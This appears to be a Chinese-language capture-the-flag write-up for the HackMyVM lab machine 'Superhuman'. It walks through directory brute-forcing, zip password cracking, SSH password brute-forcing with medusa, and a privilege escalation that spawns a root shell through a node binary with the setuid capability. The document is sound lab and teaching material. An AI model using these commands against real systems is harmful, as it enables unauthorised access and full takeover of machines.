# Superhuman

2024-11-10 https://hackmyvm.eu/machines/machine.php?vm=Superhuman

## IP

192.168.5.40

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

方位 80 web 服务，是一个空页面，在 html 源代码中发现注释：If your eye was sharper, you would see everything in motion, lol . 好像也没看出什么东西。

使用大字典全量扫描：

```
gobuster dir -q -t 64 -e -k -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,txt,zip,rar,png -u http://192.168.5.39/
```

发现 http://192.168.5.39/notes-tips.txt 内容如下：

```
F(&m'D.Oi#De4!--ZgJT@;^00D.P7@8LJ?tF)N1B@:UuC/g+jUD'3nBEb-A+De'u)F!,")@:UuC/g(Km+CoM$DJL@Q+Dbb6ATDi7De:+g@<HBpDImi@/hSb!FDl(?A9)g1CERG3Cb?i%-Z!TAGB.D>AKYYtEZed5E,T<)+CT.u+EM4--Z!TAA7]grEb-A1AM,)s-Z!TADIIBn+DGp?F(&m'D.R'_DId*=59NN?A8c?5F<G@:Dg*f@$:u@WF`VXIDJsV>AoD^&ATT&:D]j+0G%De1F<G"0A0>i6F<G!7B5_^!+D#e>ASuR'Df-\,ARf.kF(HIc+CoD.-ZgJE@<Q3)D09?%+EMXCEa`Tl/c
```

使用 base85 进行解码：

```
salome doesn't want me, I'm so sad... i'm sure god is dead...
I drank 6 liters of Paulaner.... too drunk lol. I'll write her a poem and she'll desire me. I'll name it salome_and_?? I don't know.

I must not forget to save it and put a good extension because I don't have much storage.
```

说是写了一首诗 取名为 `salome_and_??` 但是后缀名不知道，后面 2 个字符需要枚举，使用 crunch 生成 2 个字符的字典，

```
crunch 2 2 > name.txt

ffuf -c -w /usr/share/seclists/FUZZing/extensions-skipfish.fuzz.txt:W1 -w ./name.txt:W2 -u http://192.168.5.39/salome_and_W2.W1
```

找到 http://192.168.5.39/salome_and_me.zip 是个加密 zip，zip2john 和 john 找出其解压密码为 turtle 解压后的内容为：

```
----------------------------------------------------

	     GREAT POEM FOR SALOME

----------------------------------------------------


My name is fred,
And tonight I'm sad, lonely and scared,
Because my love Salome prefers schopenhauer, asshole,
I hate him he's stupid, ugly and a peephole,
My darling I offered you a great switch,
And now you reject my love, bitch
I don't give a fuck, I'll go with another lady,
And she'll call me BABY!
```

得到了一个用户名 fred , 上面的提示重点强调了这首诗，会不会密码就在这里面，收集它的单词作为字典，对 fred 用户进行 ssh 登陆爆破：

```
cewl -d 3 http://192.168.5.3/salome_and_me.txt -w passwd

medusa -u fred -P passwd -M ssh -h 192.168.5.39 -v 4
```

爆破出了 fred 的密码: schopenhauer ssh 登陆上去后，读取到了 user flag：

```
fred@superhuman:~$ cat user.txt
Ineedmorepower
```

同时发现 ls 被改名了：

```
cat /usr/bin/ls
echo "lol"
kill -9 "$(ps --pid $$ -oppid=)"s
```

执行 ls 时，shell 会话就会退出，使用 dir 替代就可以 alias ls=dir 。

在 /var/www/html 中发现了一个图片 nietzsche.jpg 经过查看，图片中没有隐写信息。

sudo -l 没有发现可利用点，suid 也没有发现，最终在 getcap 中获得了提权点：

```
/usr/sbin/getcap -r / 2>/dev/null

/usr/bin/node
```

直接提权到 root：

```
/usr/bin/node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'

cd /root
# cat root.txt
Imthesuperhuman
```
